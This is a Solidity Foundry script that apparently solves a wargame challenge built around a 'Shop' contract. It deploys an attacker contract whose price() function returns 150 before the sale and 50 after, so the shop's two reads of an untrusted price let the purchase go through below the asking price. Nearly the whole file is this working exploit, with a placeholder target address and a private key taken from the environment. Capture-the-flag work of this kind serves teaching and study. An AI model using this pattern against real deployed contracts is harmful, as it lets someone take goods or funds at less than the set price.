// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Shop} from "../src/shop.sol";
import "../lib/forge-std/src/Script.sol";

// Script to deploy the shopper contract and perform the attack on the Shop contract
contract ShopAttacker is Script {
    
    // Instance of the shopper contract
    Shopper shopper;

    // Instance of the Shop contract (replace with actual contract address)
    Shop shopInstance = Shop(0xYourInstanceAddressHere);

    function run() external {
        // Start broadcasting with the private key from the .env file
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        // Deploy the shopper contract and pass the Shop instance address
        shopper = new Shopper(address(shopInstance));

        // Call the buy function through the shopper contract
        shopper.executeBuy();

        // Stop broadcasting the transaction
        vm.stopBroadcast();
    }
}

// shopper contract to exploit the Shop contract's logic
contract Shopper {
    Shop public shopInstance;

    // Constructor that initializes the Shop contract instance
    constructor(address shopAddress) {
        shopInstance = Shop(shopAddress);
    }

    // Function to trigger the buy operation on the Shop contract
    function executeBuy() public {
        shopInstance.buy();
    }

    // Function to override the price logic exploited by the Shop contract
    function price() external view returns (uint256) {
        // If the item is already sold, return a lower price
        if (shopInstance.isSold()) {
            return 50;
        } else {
            // If not sold, return a higher price
            return 150;
        }
    }
}